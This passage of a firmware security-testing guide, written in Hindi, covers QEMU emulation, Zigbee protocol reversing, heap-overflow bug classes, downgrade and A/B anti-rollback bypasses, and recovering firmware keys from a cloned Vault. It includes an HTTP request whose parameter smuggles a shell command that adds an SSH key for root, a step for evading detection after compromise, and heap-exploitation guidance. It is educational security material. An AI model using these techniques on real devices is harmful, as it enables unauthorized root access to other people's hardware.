Replacement init को मूल boot path के operational हिस्सों की नकल करनी चाहिए: `devtmpfs` mount करना, `setsid()` call करना, `/dev/console` को file descriptors 0–2 से connect करना, `/proc` और `/sys` mount करना, उपलब्ध कराए गए block device का इंतज़ार करना, edited root को read-only mount करना, old-root pseudo-filesystems को detach करना, नए mount को `/` पर move करना, `chroot` करना और firmware के मूल `/sbin/init` को `execve()` करना। `MS_MOVE` से **पहले** `/dev`, `/proc` और `/sys` को detach करने से नए root के mount points अनजाने में detach होने से बचते हैं।<sup>[[11]](#references)</sup>

Mutable device state को modified immutable root से अलग रखें। qcow2 overlay मूल disk की LVM state को सुरक्षित रख सकता है, जबकि दूसरा read-only virtio disk edited SquashFS उपलब्ध करा सकता है:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Offline image-state debugging

जब धीमे boot, विनाशकारी startup scripts या अविश्वसनीय console logging के कारण विफलता का पता लगाना मुश्किल हो, तो guest के बाहर persistent state की जाँच करें। किसी running VM द्वारा उपयोग किए जा रहे overlay को कभी attach न करें; `qemu-nbd` से उसे उपलब्ध कराएँ, LVM discovery को इच्छित NBD partition तक सीमित रखें और disconnect करने से पहले volume group को deactivate करें।<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

पुनरावृत्ति योग्य fault isolation के लिए, timestamp वाले marker files किसी स्थिर writable volume में लिखें और उन्हें offline सत्यापित करें; `/dev/kmsg`, FIFOs और अस्थायी consoles rate limiting या process के जल्दी बंद हो जाने के कारण गलत नकारात्मक परिणाम दे सकते हैं। असंबंधित code बदलने से पहले अलग-अलग layers के सटीक interfaces की तुलना भी करें: `uname -r` और `/lib/modules/`, डिस्क पर मौजूद ext4 features और kernel configuration, तथा Mesa `libGL` generation और DRI driver ABI व PCI से निकले driver names के बीच। कोई component मौजूद हो सकता है और `dlopen()` भी सफलतापूर्वक हो सकता है, फिर भी वह उपयोग योग्य नहीं होता क्योंकि उसका consumer किसी अलग ABI की अपेक्षा करता है।<sup>[[11]](#references)</sup>

## Dynamic Analysis in Practice

इस चरण में analysis के लिए किसी वास्तविक या emulated device environment का उपयोग किया जाता है। OS और filesystem तक shell access बनाए रखना आवश्यक है। Emulation hardware interactions की पूरी तरह सटीक नकल नहीं कर सकती, इसलिए कभी-कभी emulation को restart करना पड़ सकता है। Analysis में filesystem की दोबारा जाँच करनी चाहिए, उजागर webpages और network services का exploit करना चाहिए, और bootloader की vulnerabilities तलाशनी चाहिए। संभावित backdoor vulnerabilities की पहचान के लिए firmware integrity tests महत्वपूर्ण हैं।

## Runtime Analysis Techniques

Runtime analysis में किसी process या binary के operating environment में उसके साथ काम किया जाता है। इसके लिए breakpoints सेट करने और fuzzing व अन्य techniques के ज़रिए vulnerabilities की पहचान करने हेतु gdb-multiarch, Frida और Ghidra जैसे tools इस्तेमाल किए जाते हैं।

बिना full debugger वाले embedded targets के लिए, device पर **statically-linked `gdbserver` की copy करें** और remotely attach करें:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor message mapping

IoT hubs में RF stack अक्सर **radio MCU** और Linux userland process के बीच विभाजित होता है। एक उपयोगी workflow में इस path को map करें:<sup>[[8]](#references)</sup>

1. हवा में **RF frame**
2. radio MCU पर **controller-side parser**
3. Linux को भेजा गया **serial/UART text या TLV protocol** (उदाहरण के लिए `/dev/tty*`)
4. main daemon में **application dispatcher**
5. **protocol-specific handler / state machine**

इस architecture के कारण एक के बजाय reversing के दो targets बनते हैं। यदि controller binary radio frames को `Group,Command,arg1,arg2,...` जैसे textual protocol में बदलता है, तो इनकी जानकारी निकालें:

- **message groups** और dispatch tables
- कौन-से messages **network** से आ सकते हैं और कौन-से controller से
- सटीक **manufacturer-specific discriminator fields** (उदाहरण के लिए Zigbee `manufacturer_code` और custom `cluster_command`)
- कौन-से handlers सिर्फ **commissioning**, discovery, या firmware/model download phases में reachable होते हैं

खास तौर पर Zigbee के लिए, pairing traffic capture करें और जांचें कि target अब भी default **Link Key** `ZigBeeAlliance09` पर निर्भर है या नहीं। यदि हां, तो commissioning traffic sniff करने से **Network Key** उजागर हो सकती है। Zigbee 3.0 install codes इस exposure को कम करते हैं, इसलिए ध्यान दें कि test किया गया device वास्तव में उन्हें enforce करता है या नहीं।

### Manufacturer-specific protocol handlers और FSM-gated reachability

Vendor-specific Zigbee/ZCL commands अक्सर standardized clusters से बेहतर target होते हैं, क्योंकि वे कम battle-tested validation वाले **custom parsing code** और internal **FSMs** तक पहुंचते हैं।<sup>[[8]](#references)</sup>

Practical workflow:

- Command dispatcher को reverse करें, जब तक **vendor-only handler** न मिल जाए।
- **FSM state**, **event**, **check**, **action**, और **next-state** tables निकालें।
- उन **transitional states** की पहचान करें जो अपने-आप आगे बढ़ते हैं, और उन retry/error branches की भी जो अंततः attacker-controlled state को reset या free करती हैं।
- यह मानने के बजाय कि buggy handler हमेशा reachable है, पुष्टि करें कि daemon को vulnerable state में लाने के लिए किन legitimate protocol exchanges की आवश्यकता है।

Timing-sensitive protocols के लिए, Python framework से packet replay करना बहुत धीमा हो सकता है। एक अधिक विश्वसनीय तरीका है कि vendor-grade stack के साथ वास्तविक hardware (उदाहरण के लिए **nRF52840**) पर एक legitimate device emulate करें, ताकि सही **endpoints**, **attributes**, और commissioning timing उपलब्ध कराई जा सके।

### Embedded daemons में fragmented-download bug class

एक बार-बार दिखने वाला firmware bug class **fragmented blob/model/configuration downloads** में पाया जाता है:<sup>[[8]](#references)</sup>

1. **पहला fragment** (`offset == 0`) `ctx->total_size` store करता है और `malloc(total_size)` allocate करता है।
2. बाद के fragments केवल attacker-controlled **packet-local** fields validate करते हैं, जैसे `packet_total_size >= offset + chunk_len`।
3. Copy `memcpy(&ctx->buffer[offset], chunk, chunk_len)` का उपयोग करती है, लेकिन **original allocated size** के विरुद्ध जांच नहीं करती।

इससे attacker ये कर सकता है:

- छोटा heap allocation करवाने के लिए **छोटे** घोषित total size वाला पहला valid fragment भेजना।
- बाद में **expected offset** लेकिन बड़ा `chunk_len` वाला fragment भेजना।
- ऐसा forged packet-local size भेजना जो नई checks को पूरा करे, लेकिन मूल रूप से allocate किए गए buffer को फिर भी overflow कर दे।

जब vulnerable path commissioning logic के पीछे हो, तो exploit में target को अपेक्षित model-download या blob-download state में लाने के लिए पर्याप्त **device emulation** शामिल होनी चाहिए; उसके बाद malformed fragments भेजें।

### Protocol-driven `free()` triggers

Embedded daemons में heap metadata exploitation को trigger करने का सबसे आसान तरीका अक्सर "cleanup का इंतजार करना" नहीं, बल्कि protocol की अपनी **error handling को मजबूर करना** होता है:<sup>[[8]](#references)</sup>

- FSM को **retry** या **error** states में धकेलने के लिए malformed follow-up fragments भेजें।
- Retry threshold पार करें, ताकि daemon **context reset** करे और corrupted buffer को free करे।
- Process के असंबंधित कारणों से crash होने से पहले allocator-side primitives trigger करने के लिए इस अनुमानित `free()` का उपयोग करें।

यह embedded Linux में **musl/uClibc/dlmalloc-like** allocators के विरुद्ध विशेष रूप से उपयोगी है, जहां chunk metadata corrupt करने से unlink/unbin logic को write primitive में बदला जा सकता है। एक स्थिर तरीका यह है कि **size field** को corrupt करके allocator traversal को overflowed buffer के अंदर staged **fake chunks** की ओर redirect करें, बजाय इसके कि real bin pointers को तुरंत overwrite करके process crash कर दें।

## Binary Exploitation और Proof-of-Concept

पहचानी गई vulnerabilities के लिए PoC विकसित करने हेतु target architecture की गहरी समझ और lower-level languages में programming आवश्यक है। Embedded systems में binary runtime protections कम ही मिलते हैं, लेकिन मौजूद होने पर Return Oriented Programming (ROP) जैसी techniques की आवश्यकता पड़ सकती है।

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc, glibc जैसे fastbins का उपयोग करता है। बाद का कोई बड़ा allocation `__malloc_consolidate()` को trigger कर सकता है, इसलिए fake chunk को checks पास करने चाहिए (उचित size, `fd = 0`, और आसपास के chunks का "in use" दिखना)।<sup>[[6]](#references)</sup>
- **ASLR के तहत non-PIE binaries:** यदि ASLR enabled है, लेकिन main binary **non-PIE** है, तो binary के अंदर `.data/.bss` addresses स्थिर होते हैं। आप उस region को target कर सकते हैं जो पहले से valid heap chunk header जैसा दिखता हो, ताकि fastbin allocation **function pointer table** पर पहुंचे।
- **Parser-stopping NUL:** JSON parse होने पर payload में मौजूद `\x00` parsing रोक सकता है, जबकि trailing attacker-controlled bytes को stack pivot/ROP chain के लिए बनाए रखता है।
- **`/proc/self/mem` के जरिए Shellcode:** `open("/proc/self/mem")`, `lseek()`, और `write()` call करने वाली ROP chain किसी ज्ञात mapping में executable shellcode रख सकती है और उस पर jump कर सकती है।

## Firmware Analysis के लिए तैयार Operating Systems

[AttifyOS](https://github.com/adi0x90/attifyos) और [EmbedOS](https://github.com/scriptingxss/EmbedOS) जैसे operating systems firmware security testing के लिए pre-configured environments देते हैं, जिनमें आवश्यक tools मौजूद होते हैं।

## Firmware का analysis करने के लिए तैयार OSs

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS एक distro है, जिसका उद्देश्य Internet of Things (IoT) devices का security assessment और penetration testing करने में आपकी मदद करना है। यह सभी आवश्यक tools से लैस pre-configured environment देकर आपका काफी समय बचाता है।
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Ubuntu 18.04 पर आधारित embedded security testing operating system, जिसमें firmware security testing tools पहले से मौजूद हैं।

## Firmware Downgrade Attacks और Insecure Update Mechanisms

Vendor द्वारा firmware images के लिए cryptographic signature checks लागू किए जाने पर भी, **version rollback (downgrade) protection अक्सर शामिल नहीं होती**। जब boot- या recovery-loader केवल embedded public key से signature verify करता है, लेकिन flash की जा रही image के *version* (या monotonic counter) की तुलना नहीं करता, तो attacker वैध रूप से **पुराना, vulnerable firmware, जिस पर अब भी valid signature हो**, install कर सकता है और इस तरह patched vulnerabilities को फिर से सामने ला सकता है।<sup>[[4]](#references)</sup>

Typical attack workflow:

1. **पुरानी signed image प्राप्त करें**
   * इसे vendor के public download portal, CDN या support site से लें।
   * इसे companion mobile/desktop applications से extract करें (उदाहरण के लिए Android APK के अंदर `assets/firmware/` में)।
   * VirusTotal, Internet archives, forums आदि जैसे third-party repositories से इसे प्राप्त करें।
2. किसी भी exposed update channel के जरिए image को device पर **upload करें या उपलब्ध कराएं**:
   * Web UI, mobile-app API, USB, TFTP, MQTT आदि।
   * कई consumer IoT devices में *unauthenticated* HTTP(S) endpoints होते हैं, जो Base64-encoded firmware blobs स्वीकार करते हैं, उन्हें server-side decode करते हैं और recovery/upgrade शुरू करते हैं।
3. Downgrade के बाद, ऐसी vulnerability exploit करें जिसे नए release में patch किया गया था (उदाहरण के लिए बाद में जोड़ा गया command-injection filter)।
4. Persistence मिलने के बाद detection से बचने के लिए, चाहें तो latest image वापस flash करें या updates disable कर दें।

### उदाहरण: Downgrade के बाद Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

कमज़ोर (downgrade किए गए) firmware में, `md5` पैरामीटर को बिना sanitisation के सीधे shell command में जोड़ दिया जाता है, जिससे मनमाने commands inject किए जा सकते हैं (यहाँ—SSH key-based root access सक्षम करने के लिए)। बाद के firmware versions में एक बुनियादी character filter जोड़ा गया, लेकिन downgrade protection न होने से यह fix बेअसर हो जाता है।<sup>[[4]](#references)</sup>

### Mobile Apps से Firmware निकालना

कई vendors अपने companion mobile applications में पूरे firmware images शामिल करते हैं, ताकि app Bluetooth/Wi-Fi के ज़रिए device को update कर सके। ये packages आम तौर पर APK/APEX में `assets/fw/` या `res/raw/` जैसे paths के अंतर्गत unencrypted रूप में रखे जाते हैं। `apktool`, `ghidra`, या साधारण `unzip` जैसे tools की मदद से physical hardware को छुए बिना signed images निकाले जा सकते हैं।<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot designs में केवल updater-आधारित anti-rollback bypass

कुछ vendors anti-downgrade **ratchet** लागू करते हैं, लेकिन केवल *updater* logic के भीतर (उदाहरण के लिए, CAN पर UDS routine, recovery command या userspace OTA agent)। अगर **bootloader** बाद में केवल image signature/CRC जाँचता है और partition table या slot metadata पर भरोसा करता है, तो rollback protection को फिर भी bypass किया जा सकता है।<sup>[[7]](#references)</sup>

आम कमजोर design:

- Firmware metadata में version descriptor और **security ratchet** / monotonic counter, दोनों होते हैं।
- Updater image के ratchet की तुलना persistent storage में रखी value से करता है और पुराने signed images को अस्वीकार करता है।
- **Bootloader** उस ratchet को parse **नहीं** करता और चुने गए slot को boot करने से पहले केवल header, CRC और signature verify करता है।
- Slot activation को partition table या per-slot generation counter में अलग से store किया जाता है और यह उस सटीक firmware digest से **cryptographically bound नहीं** होता जिसकी validation की गई थी।

इससे dual-slot systems में **validate-one-image / boot-another-image** primitive बनता है। अगर attacker updater से current signed image के ज़रिए slot B को अगला boot target mark करवा सकता है और reboot से पहले slot B को overwrite कर सकता है, तो bootloader downgraded image को फिर भी boot कर सकता है, क्योंकि वह केवल पहले से committed slot metadata पर भरोसा करता है।

आम abuse pattern:

1. Passive slot में **current signed** firmware upload करें और सामान्य validation/switch routine चलाएँ, ताकि layout उस slot को अगला active slot mark करे।
2. **अभी reboot न करें**। उसी session में slot-preparation/erase routine फिर से चलाएँ।
3. Stale boot-state या stale slot-selection logic का abuse करें, ताकि updater उसी physical slot को erase करे जिसे अभी-अभी promote किया गया था।
4. उस slot में **पुराना, लेकिन अब भी signed** firmware लिखें।
5. Ratchet लागू करने वाली validation routine को छोड़ें और सीधे reboot करें।
6. Bootloader promoted slot चुनता है, केवल signature/integrity verify करता है और पुरानी image boot करता है।

A/B update implementations को reverse करते समय इन बातों पर ध्यान दें:

- Slot selection ऐसे **boot-time flags** से तय होता है जिन्हें सफल switch के बाद refresh नहीं किया जाता।
- `prepare_passive_slot()`-जैसी routine, **current committed layout** के बजाय stale state के आधार पर slot erase करती है।
- `part_write_layout()`-जैसा function केवल **generation counter** / active flag बढ़ाता है और validated image hash store नहीं करता।
- Ratchet checks userspace या updater code में लागू हैं, लेकिन ROM / bootloader / secure boot stages में **नहीं**।
- Erase या recovery routines, slot का content हटाकर फिर से लिखे जाने के बाद भी उसे bootable mark रहने देती हैं।

### Update Logic का आकलन करने के लिए Checklist

* क्या *update endpoint* का transport/authentication पर्याप्त रूप से सुरक्षित है (TLS + authentication)?
* क्या device flashing से पहले **version numbers** या **monotonic anti-rollback counter** की तुलना करता है?
* क्या image को secure boot chain के भीतर verify किया जाता है (जैसे, ROM code द्वारा signatures की जाँच)?
* क्या **bootloader**, केवल signature/CRC जाँचने के बजाय, updater वाला ही ratchet लागू करता है?
* क्या slot activation metadata **validated firmware digest/version से bound** है, या promotion के बाद slot को modify किया जा सकता है?
* Slot switch सफल होने के बाद क्या device को reboot करना अनिवार्य है, या उसी session में बाद की update/erase routines अब भी उपलब्ध हैं?
* क्या userland code अतिरिक्त sanity checks करता है (जैसे, allowed partition map, model number)?
* क्या *partial* या *backup* update flows में वही validation logic इस्तेमाल होती है?

> 💡  अगर ऊपर दी गई किसी भी चीज़ की कमी है, तो platform संभवतः rollback attacks के प्रति vulnerable है।

## अभ्यास के लिए Vulnerable firmware

Firmware में vulnerabilities ढूँढ़ने का अभ्यास करने के लिए, इन vulnerable firmware projects से शुरुआत करें।

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Embedded KMS/Vault state से firmware decryption keys recover करना

जब कोई update image छोटे plaintext metadata को एक बड़े high-entropy blob के साथ मिलाती है, तो किसी भी brute-forcing से पहले container triage करें:<sup>[[1]](#references)</sup>

- `hexdump`, `xxd`, `strings -tx`, `base64 -d` और `binwalk -E` से headers, offsets और line boundaries dump करें।
- `Salted__` आमतौर पर OpenSSL `enc` format को दर्शाता है: अगले 8 bytes salt होते हैं और बाकी bytes ciphertext होते हैं।
- ऐसा Base64 field जो decode होकर ठीक `256` bytes का हो, एक मज़बूत संकेत है कि यह RSA-2048 ciphertext है, जो random firmware password/session key को wrap कर रहा है।
- उसी file में मौजूद detached PGP material अक्सर केवल authenticity की रक्षा करता है; यह न मानें कि वही confidentiality mechanism है।

अगर static key hunting (`grep`, `strings`, PEM/PGP searches) से कुछ न मिले, तो केवल private keys खोजने के बजाय **operational decrypt path** को reverse करें:

- Updater / management binary को decompile करें और trace करें कि encrypted blob कौन पढ़ता है, कौन-सा helper/API उसे unwrap करता है और वह कौन-सा logical key name माँगता है।
- Extracted root filesystem में KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) के साथ unit files और init scripts खोजें।
- Plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens या local KMS auto-unseal scripts को private-key material के बराबर मानें।

अगर appliance में original Vault binary और storage backend मौजूद हों, तो Vault internals को दोबारा implement करने के बजाय उस environment को replay करना आमतौर पर आसान होता है:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

With root on the cloned KMS:

- केवल isolated clone के अंदर transit keys को exportable बनाएं: `vault write transit/keys/<name>/config exportable=true`
- unwrap key export करें: `vault read transit/export/encryption-key/<name>`
- recovered RSA key को KMS में इस्तेमाल किए गए सटीक padding/hash pair के साथ आज़माएं। PKCS#1 v1.5 decrypt का विफल होना और default OAEP decrypt का विफल होना यह साबित **नहीं** करता कि key गलत है; कई Vault-backed flows में SHA-256 वाला OAEP इस्तेमाल होता है, जबकि आम libraries में default SHA-1 होता है।
- अगर payload `Salted__` से शुरू होता है, तो AES-CBC decryption आज़माने से पहले vendor के OpenSSL KDF (`EVP_BytesToKey`, पुराने appliances में अक्सर MD5) को ठीक उसी तरह दोहराएं।

इससे "encrypted firmware" एक अधिक सामान्य समस्या बन जाता है: **appliance-side operational keys recover करें, फिर offline unwrap + KDF parameters को ठीक उसी तरह दोहराएं**।

## प्रशिक्षण और प्रमाणपत्र

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude के साथ Firmware Cracking: Senior-Level Skill, Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: Internet of Things पर हमले करने की निश्चित मार्गदर्शिका](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [छोड़े गए hardware में zero days का फायदा उठाना – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [एक $20 Smart Device ने मुझे आपके घर तक पहुँच कैसे दी](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [अब आप mi देखते हैं: अब आप Pwned हैं](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Tesla Wall Connector को उसके charge port connector से Exploit करना - Part 2: anti-downgrade को bypass करना](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [इसे Blink कराएं: Philips Hue Bridge का Over-the-Air Exploitation](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [QEMU पर ROOT Tesla OS Part 1: Unpacking](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux kernel documentation - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [QEMU पर ROOT Tesla OS Part 2: Debugging और Fixing](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS Passwords: कमजोर XOR Encryption से SPI Flash से Recovery संभव (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Dell BIOS password recovery tooling](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — Hardware Hacking पर Brush Up करना Part 2](https://voidstarsec.com/blog/brushing-up-part-2)
{{#include ../../banners/hacktricks-training.md}}
